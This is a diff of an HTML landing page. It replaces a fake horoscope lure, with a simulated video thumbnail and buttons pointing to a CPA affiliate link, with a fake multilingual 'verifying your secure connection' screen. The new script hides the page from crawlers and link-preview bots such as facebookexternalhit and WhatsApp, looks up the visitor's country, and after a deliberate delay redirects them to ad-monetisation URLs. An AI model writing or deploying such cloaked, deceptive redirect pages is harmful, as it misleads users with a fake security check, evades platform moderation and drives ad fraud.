@@ -1,107 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>🔮 Your Daily Horoscope Is Ready!</title>
+  <meta charset="UTF-8">
+  <title>Verificando...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- Meta tags for social sharing -->
-  <meta property="og:title" content="🔮 Your Daily Horoscope Is Ready!" />
-  <meta property="og:description" content="Tap to reveal what the stars have aligned for you today ✨" />
-  <meta property="og:image" content="https://yourdomain.com/images/horoscope-preview.jpg" /> <!-- CHANGE THIS -->
-  <meta property="og:type" content="website" />
-  <meta property="og:url" content="https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global" />
-
-  <!-- Twitter -->
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="✨ Your Horoscope Has Been Updated!" />
-  <meta name="twitter:description" content="See what’s coming in love, money and destiny 💫" />
-  <meta name="twitter:image" content="https://yourdomain.com/images/horoscope-preview.jpg" />
+  <!-- Anti-bot básico -->
+  <script>
+    const blockedAgents = ["bot", "crawl", "spider", "facebookexternalhit", "WhatsApp"];
+    if (blockedAgents.some(b => navigator.userAgent.toLowerCase().includes(b))) {
+      document.write("Blocked");
+      throw new Error("Bot blocked");
+    }
+  </script>
 
   <style>
     body {
-      background-color: #0a0a1a;
-      color: white;
-      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #000;
+      color: #fff;
+      font-family: sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
       text-align: center;
-      padding: 30px;
+      padding: 20px;
     }
-
-    h1 {
-      font-size: 30px;
-      color: #ffd700;
-      margin-bottom: 10px;
-    }
-
-    p {
-      font-size: 18px;
-      margin-top: 0;
-    }
-
-    .fake-video {
-      margin-top: 20px;
-      border: 5px solid #ffd700;
-      border-radius: 12px;
-      box-shadow: 0 0 10px #ffd700;
-      cursor: pointer;
-    }
-
-    .cta-button {
-      display: inline-block;
-      margin-top: 25px;
-      padding: 14px 28px;
-      font-size: 18px;
-      background-color: #ffd700;
-      color: #000;
-      text-decoration: none;
-      border-radius: 10px;
-      font-weight: bold;
-    }
-
-    .cta-button:hover {
-      background-color: #ffcc00;
+    .msg {
+      font-size: 1.6rem;
+      line-height: 1.5;
     }
   </style>
-
-  <script>
-    const CPA_URL = "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global"; // Replace with your CPA link
-
-    function isBot() {
-      const ua = navigator.userAgent.toLowerCase();
-      const bots = ["facebookexternalhit", "bot", "crawl", "spider", "slurp", "bingbot", "googlebot"];
-      return bots.some(bot => ua.includes(bot));
-    }
-
-    function detectUserBehavior() {
-      let isHuman = false;
-      window.addEventListener('mousemove', () => { isHuman = true; });
-
-      setTimeout(() => {
-        if (!isHuman || isBot()) {
-          window.location.href = CPA_URL;
-        }
-      }, 3000);
-    }
-
-    window.onload = detectUserBehavior;
-  </script>
 </head>
 <body>
-  <h1>🔮 Today’s Horoscope</h1>
-  <p>Tap below to reveal your zodiac prediction for today ✨</p>
+  <div class="msg" id="message">Loading...</div>
 
-  <!-- Thumbnail simulating video -->
-  <a href="https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global">
-    <img src="https://i.postimg.cc/CKk3cSt9/Descubre-tu-Hor-scopo-Diario.png" />
-  </a>
+  <script>
+    const messages = {
+      "en": "🔒 Verifying your secure connection...\nPlease wait a moment.",
+      "es": "🔒 Verificando tu conexión segura...\nPor favor espera un momento.",
+      "fr": "🔒 Vérification de votre connexion sécurisée...\nVeuillez patienter.",
+      "pt": "🔒 Verificando sua conexão segura...\nPor favor, aguarde.",
+      "de": "🔒 Verbindung wird überprüft...\nBitte warten.",
+      "default": "🔒 Checking connection...\nPlease wait..."
+    };
 
-  <br />
+    const lang = navigator.language.slice(0, 2);
+    const text = messages[lang] || messages["default"];
+    document.getElementById("message").innerText = text;
 
-  <!-- CTA Button -->
-  <a class="cta-button" href="https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global">✨ Reveal My Horoscope Now</a>
+    async function geoRedirect() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        const country = data.country_code;
 
-  <!-- Optional Tracking Script -->
-  <script id="_wauup1">var _wau = _wau || []; _wau.push(["small", "lonelywolfusa", "up1"]);</script>
-  <script async src="//waust.at/s.js"></script>
+        const urls = {
+          "US": "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
+          "NG": "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
+          "BR": "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
+          "AO": "https://www.profitableratecpm.com/y8e064uw?key=163aa1a229d900a8ded967f53b6a45ca",
+          "FR": "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
+          "default": "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global"
+        };
+
+        const target = urls[country] || urls["default"];
+
+        // Redirección retardada para mejorar visibilidad (CPM)
+        setTimeout(() => {
+          window.location.href = target;
+        }, 1800);
+      } catch (e) {
+        console.warn("Geo detection failed", e);
+        window.location.href = "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global";
+      }
+    }
+
+    window.onload = geoRedirect;
+  </script>
 </body>
 </html>
